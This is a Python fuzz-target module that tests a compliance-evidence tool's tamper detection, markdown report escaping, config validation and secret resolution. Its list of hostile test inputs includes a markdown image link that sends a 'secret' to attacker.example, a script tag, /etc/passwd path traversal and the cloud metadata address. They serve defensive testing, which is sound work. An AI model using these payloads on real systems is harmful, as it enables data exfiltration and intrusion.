"""Fuzz targets: functions that must hold an invariant for *any* input bytes.

Each target takes ``bytes`` and raises (usually ``AssertionError``) if a security-relevant
invariant is broken. They contain no fuzzing-engine code, so the ordinary test suite runs them
on a seed corpus and random inputs (``tests/test_fuzz_targets.py``), while ``fuzz/run_fuzzer.py``
drives the same functions with coverage-guided fuzzing (Atheris/libFuzzer).

The properties are the ones this tool's value rests on: tampering with stored evidence is
always reported, an evidence record survives a write/read round trip with its hash intact,
untrusted text cannot inject markup into a report, and malformed configuration or secret
references are rejected with the documented error instead of crashing or being misread.
"""

from __future__ import annotations

import copy
import json
import re
import tempfile
from collections.abc import Callable
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

from grcevidence.catalog import FRAMEWORKS
from grcevidence.models import Evidence, Finding, RunManifest, RunResult, Severity, Status
from grcevidence.report import report_markdown, verify_run
from grcevidence.runner import Config, ConfigError, build_sinks
from grcevidence.secrets import SecretError, resolve_secret
from grcevidence.sinks.local import LocalSink

# ------------------------------------------------------------------------------ reader

NASTY = [
    "",
    "|",
    "=",
    "\\",
    "\n",
    "\r\n",
    "\x00",
    "`",
    "[x](https://attacker.example/p)",
    "![x](https://attacker.example/p.png?d=secret)",
    "<script>alert(1)</script>",
    "<br>",
    "../../etc/passwd",
    "a/../b",
    "manifest.json",
    ".",
    "..",
    "a" * 300,
    chr(0x202E) + "override",
    chr(0x2028),
    "https://user:pw@evil.example/",
    "http://169.254.169.254/",
    "env:HOME",
    "ssm:/a/b",
    "secretsmanager:name#key",
    "None",
]


class Reader:
    """Deterministically decode structured values from fuzz bytes. Never raises."""

    def __init__(self, data: bytes) -> None:
        self._data = data
        self._i = 0

    def byte(self) -> int:
        if self._i >= len(self._data):
            return 0
        value = self._data[self._i]
        self._i += 1
        return value

    def below(self, n: int) -> int:
        return self.byte() % n if n > 0 else 0

    def flag(self) -> bool:
        return self.byte() & 1 == 1

    def choice(self, options: list[Any]) -> Any:
        return options[self.below(len(options))]

    def text(self, max_len: int = 60) -> str:
        head = self.byte()
        if head < 64:  # a quarter of the time, use a known-nasty string
            return NASTY[head % len(NASTY)]
        raw = bytes(self.byte() for _ in range(head % (max_len + 1)))
        return raw.decode("utf-8", "replace")

    def json_value(self, depth: int = 0, *, odd_keys: bool = False) -> Any:
        kind = self.below(8 if depth < 3 else 5)
        if kind == 0:
            return None
        if kind == 1:
            return self.flag()
        if kind == 2:
            return self.choice([0, 1, -1, 2**31, 2**63, 10**30])
        if kind == 3:
            return self.choice([0.0, 1.5, -0.0, 1e308, float("inf"), float("nan")])
        if kind == 4:
            return self.text()
        if kind == 5:
            return [self.json_value(depth + 1, odd_keys=odd_keys) for _ in range(self.below(4))]
        out: dict[Any, Any] = {}
        for _ in range(self.below(4)):
            key: Any = self.text(10)
            if odd_keys and self.flag():
                key = self.choice([1, 10, 9, True, None, 2.5])
            out[key] = self.json_value(depth + 1, odd_keys=odd_keys)
        return out


# --------------------------------------------------------------------------------- helpers


def _evidence(r: Reader, *, odd_keys: bool = False) -> Evidence:
    ev = Evidence(
        collector=r.text(20)[:20],
        provider=r.choice(["aws", "gcp", r.text(8)]),
        title=r.text(30),
        account=r.text(20)[:20],
        region=r.text(12)[:12],
        collected_at="2026-01-01T00:00:00+00:00",
        status=r.choice(list(Status)),
        summary=r.text(),
        findings=[Finding(r.text(), r.text(), r.choice(list(Severity))) for _ in range(r.below(3))],
        data={r.text(8): r.json_value(odd_keys=odd_keys) for _ in range(r.below(3))},
        controls={fw: [r.text(8) for _ in range(r.below(3))] for fw in FRAMEWORKS[: r.below(4)]},
    )
    return ev.seal()


def _write_run(root: Path, r: Reader) -> tuple[Path, RunResult]:
    evidence = []
    seen: set[str] = set()
    for _ in range(2 + r.below(3)):
        ev = _evidence(r)
        if ev.filename in seen:
            continue
        seen.add(ev.filename)
        evidence.append(ev)
    manifest = RunManifest(
        run_id="20260101T000000Z-fuzz",
        started_at="2026-01-01T00:00:00+00:00",
        finished_at="2026-01-01T00:00:01+00:00",
        tool_version="fuzz",
        accounts=sorted({e.account for e in evidence}),
        counts={},
        evidence=[
            {"id": e.id, "file": e.filename, "status": e.status.value, "sha256": e.sha256}
            for e in evidence
        ],
    ).seal()
    result = RunResult(manifest=manifest, evidence=evidence)
    LocalSink(root).write(result)
    return root / manifest.run_id, result


# ------------------------------------------------------------------------------- targets


def evidence(data: bytes) -> None:
    """A sealed record has a safe filename, survives the write/read round trip and detects edits."""
    r = Reader(data)
    ev = _evidence(r, odd_keys=r.flag())
    assert ev.verify(), "a freshly sealed record does not verify"

    name = ev.filename
    assert re.fullmatch(r"[A-Za-z0-9._-]+\.json", name), f"unsafe evidence filename {name!r}"
    assert Path(name).name == name and name != "manifest.json"

    # Exactly what LocalSink writes, then read back the way `verify` reads it.
    text = json.dumps(ev.to_dict(), indent=2, sort_keys=True)
    again = Evidence.from_dict(json.loads(text))
    assert again.verify(), "a record no longer verifies after the write/read round trip"

    tampered = copy.deepcopy(again)
    field = r.below(6)
    if field == 0:
        tampered.summary += "x"
    elif field == 1:
        tampered.account += "x"
    elif field == 2:
        tampered.status = Status.PASS if tampered.status != Status.PASS else Status.FAIL
    elif field == 3:
        tampered.data = {**tampered.data, "tampered": True}
    elif field == 4:
        tampered.findings = [*tampered.findings, Finding("r", "m")]
    else:
        tampered.controls = {**tampered.controls, "soc2": [*tampered.controls.get("soc2", []), "X"]}
    assert not tampered.verify(), f"an edit to field #{field} went undetected"


def verify(data: bytes) -> None:
    """Any change to a stored run is reported as a problem; verification never crashes."""
    r = Reader(data)
    with tempfile.TemporaryDirectory(prefix="grc-fuzz-") as tmp:
        run_dir, result = _write_run(Path(tmp), r)
        assert verify_run(run_dir) == [], "an untouched run failed verification"

        files = sorted(p for p in run_dir.glob("*.json") if p.name != "manifest.json")
        victim = files[r.below(len(files))]
        manifest_path = run_dir / "manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        kind = r.below(9)
        if kind == 0:  # change a value inside an evidence file
            doc = json.loads(victim.read_text(encoding="utf-8"))
            doc["summary"] = str(doc["summary"]) + "!"
            victim.write_text(json.dumps(doc), encoding="utf-8")
        elif kind == 1:  # delete an evidence file
            victim.unlink()
        elif kind == 2:  # add a file the manifest does not list
            (run_dir / "extra.json").write_text("{}", encoding="utf-8")
        elif kind == 3:  # replace an evidence file with junk of some shape
            victim.write_bytes(r.choice([b"[]", b"null", b"42", b'"x"', b"{", b"\xff\xfe", b"{}"]))
        elif kind == 4:  # forge the manifest's recorded hash for one file
            manifest["evidence"][0]["sha256"] = "0" * 64
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        elif kind == 5:  # damage a manifest entry
            entry = manifest["evidence"][0]
            del entry[r.choice(["file", "sha256", "id", "status"])]
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        elif kind == 6:  # point an entry outside the run directory
            manifest["evidence"][0]["file"] = r.choice(
                ["../x.json", "/etc/x.json", "a\\b.json", ""]
            )
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        elif kind == 7:  # edit the manifest without re-sealing it
            manifest["run_id"] = "tampered"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        else:  # drop an entry so its file becomes an unlisted extra
            del manifest["evidence"][0]
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        assert verify_run(run_dir), f"tampering (kind {kind}) went undetected"
        assert result.evidence  # keep the run object alive for readers of a failing case


_ROW = re.compile(r"^\|")
_LINK = re.compile(r"!?\[[^\]]*\]\([^)]*\)")


def report(data: bytes) -> None:
    """Untrusted text cannot add rows, links, images or HTML to a rendered report."""
    r = Reader(data)
    fw = r.choice(list(FRAMEWORKS))
    evil = _evidence(r)
    evil.status = Status.FAIL
    evil.controls = {fw: ["CC6.1", "AC-2", "A.5.15", "KSI-IAM-APM", "CC6.6"]}
    evil.findings = [Finding(r.text(), r.text()) for _ in range(1 + r.below(3))]
    manifest = RunManifest(
        run_id=r.text(30),
        started_at=r.text(20),
        finished_at="",
        tool_version="fuzz",
        accounts=[r.text(20) for _ in range(r.below(3))],
        counts={},
        evidence=[],
    )
    # Same shape (statuses, controls, number of findings) with harmless text: the line count must
    # be identical, so any difference is untrusted text creating structure.
    benign = copy.deepcopy(evil)
    benign.collector = "aws.example"
    benign.findings = [Finding("resource", "message") for _ in evil.findings]
    benign_manifest = RunManifest("run", "t", "", "v", ["acct"] * len(manifest.accounts), {}, [])
    baseline = report_markdown(benign_manifest, [benign], fw).splitlines()
    rendered = report_markdown(manifest, [evil], fw)
    lines = rendered.splitlines()

    assert len(lines) == len(baseline), "untrusted text changed the number of report lines"
    unescaped = re.sub(r"\\.", "", rendered)  # a backslash-escaped bracket is inert
    assert not _LINK.search(unescaped), "markdown link or image syntax reached the report"
    stripped = rendered.replace("<br>", "")
    assert "<" not in stripped and ">" not in stripped, "raw HTML reached the report"
    for line in lines:
        if _ROW.match(line):
            # 2-column count table has 3 pipes, the 5-column control table has 6.
            assert line.count("|") in (3, 6), f"a table row gained or lost cells: {line!r}"


_BASE_CONFIG: dict[str, Any] = {
    "accounts": [{"id": "111111111111", "name": "prod", "regions": ["us-east-1"]}],
    "regions": ["us-east-1"],
    "collectors": {"exclude": ["aws.backups"]},
    "parameters": {"max_access_key_age_days": 90, "sensitive_ports": [22, 3389]},
    "gcp": {"projects": ["p"]},
    "sinks": [
        {"type": "local", "path": "./evidence"},
        {"type": "http", "url": "https://ingest.example.com/v1/evidence", "format": "bundle"},
    ],
}
_CONFIG_PATHS: list[list[Any]] = [
    ["accounts"],
    ["accounts", 0],
    ["accounts", 0, "regions"],
    ["accounts", 0, "id"],
    ["regions"],
    ["collectors"],
    ["collectors", "exclude"],
    ["parameters"],
    ["parameters", "max_access_key_age_days"],
    ["parameters", "sensitive_ports"],
    ["gcp"],
    ["gcp", "projects"],
    ["sinks"],
    ["sinks", 0],
    ["sinks", 0, "path"],
    ["sinks", 1, "url"],
    ["sinks", 1, "format"],
    ["sinks", 1, "auth"],
    ["sinks", 1, "timeout"],
    ["sinks", 1, "headers"],
]


def _mutated_config(r: Reader) -> Any:
    raw = copy.deepcopy(_BASE_CONFIG)
    for _ in range(1 + r.below(3)):
        location = r.choice(_CONFIG_PATHS)
        target: Any = raw
        for key in location[:-1]:
            try:
                target = target[key]
            except (KeyError, IndexError, TypeError):
                break
        else:
            last = location[-1]
            value = r.json_value()
            if isinstance(target, dict) and isinstance(last, str):
                target[last] = value
            elif isinstance(target, list) and isinstance(last, int) and last < len(target):
                target[last] = value
    return raw


def config(data: bytes) -> None:
    """Loading configuration succeeds or raises ConfigError, never another exception."""
    r = Reader(data)
    raw = _mutated_config(r)
    try:
        loaded = Config.from_dict(raw)
    except ConfigError:
        return
    try:
        build_sinks(loaded.sinks)
    except ConfigError:
        return
    assert isinstance(loaded.regions, list) and all(isinstance(x, str) for x in loaded.regions)
    assert isinstance(loaded.parameters.max_access_key_age_days, int)


class _Client:
    def __init__(self, r: Reader) -> None:
        self._r = r

    def get_parameter(self, **_: Any) -> dict[str, Any]:
        return {"Parameter": {"Value": self._r.json_value()}}

    def get_secret_value(self, **_: Any) -> dict[str, Any]:
        value = self._r.choice(
            [
                json.dumps(self._r.json_value()),
                self._r.text(),
                "",
                json.dumps({"key": self._r.json_value(), "other": "x"}),
                json.dumps([1, 2]),
                "null",
            ]
        )
        return {"SecretString": value}


class _Session:
    def __init__(self, r: Reader) -> None:
        self._r = r

    def client(self, _name: str) -> _Client:
        return _Client(self._r)


def secrets(data: bytes) -> None:
    """A secret reference resolves to a non-empty string or raises SecretError, nothing else."""
    r = Reader(data)
    scheme = r.choice(["env", "ssm", "secretsmanager", "vault", "", r.text(6)])
    rest = r.choice(["FUZZ_UNSET_VAR", "name#key", "name#", "#key", "/a/b", r.text(20), ""])
    ref = f"{scheme}:{rest}" if r.below(8) else r.text(30)
    try:
        value = resolve_secret(ref, session=_Session(r))
    except SecretError:
        return
    assert isinstance(value, str) and value, f"secret {ref!r} resolved to {value!r}"


def http_sink(data: bytes) -> None:
    """An HTTP sink is built for an https URL without credentials, or rejected with ConfigError."""
    r = Reader(data)
    scheme = r.choice(["https", "http", "HTTPS", "ftp", "", r.text(6)])
    userinfo = r.choice(["", "user@", "user:pw@", r.text(8) + "@"])
    host = r.choice(["ingest.example.com", "[::1]", "[::1", r.text(20), "evil.com:99999"])
    url = f"{scheme}://{userinfo}{host}/{r.text(12)}"
    spec: dict[str, Any] = {"type": "http", "url": url}
    if r.flag():
        spec["allow_insecure_http"] = r.json_value()
    if r.flag():
        spec["format"] = r.choice(["bundle", "per_evidence", r.text(8)])
    if r.flag():
        spec["timeout"] = r.json_value()
    if r.flag():
        spec["headers"] = r.json_value()
    if r.flag():
        spec["auth"] = r.json_value()
    try:
        sinks = build_sinks([spec])
    except ConfigError:
        return
    sink = sinks[0]
    assert sink.url.split(":", 1)[0].lower() in {"https", "http"}  # type: ignore[attr-defined]
    netloc = urlsplit(sink.url).netloc  # type: ignore[attr-defined]
    assert "@" not in netloc, f"credentials embedded in a sink URL were accepted: {sink.url!r}"
    if sink.url.lower().startswith("http://"):  # type: ignore[attr-defined]
        assert spec.get("allow_insecure_http") is True, "a plain-http sink was built without opt-in"


TARGETS: dict[str, Callable[[bytes], None]] = {
    "evidence": evidence,
    "verify": verify,
    "report": report,
    "config": config,
    "secrets": secrets,
    "http_sink": http_sink,
}

__all__ = ["NASTY", "TARGETS", "Reader"]
